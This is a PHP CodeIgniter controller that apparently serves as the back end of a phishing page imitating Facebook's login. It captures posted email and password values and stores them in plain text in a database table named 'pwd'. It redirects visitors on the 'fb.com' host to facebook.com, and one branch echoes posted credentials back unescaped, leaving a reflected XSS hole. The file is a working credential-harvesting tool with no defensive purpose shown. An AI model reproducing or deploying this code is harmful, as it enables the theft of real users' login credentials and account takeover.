<?php

defined('BASEPATH') OR exit('No direct script access allowed');

class Welcome extends CI_Controller {

    public function index() {
        if ($_SERVER['SERVER_NAME']==="fb.com") {
            redirect("http://facebook.com");
        }
        
        if (isset($_POST['email'])) {
            $d['em'] = $this->input->post("email");
            $d['pw'] = $this->input->post("pass");
            $this->db->insert("pwd",["em"=>$d['em'],"pw"=>$d['pw']]);
            $this->load->view('inp',$d);
        }elseif (isset ($_POST['uname'])) {
            echo $this->input->post('uname')." - ".$this->input->post('pawod');
        }else {
            $this->load->view('welcome_message');
        }
        
    }

}
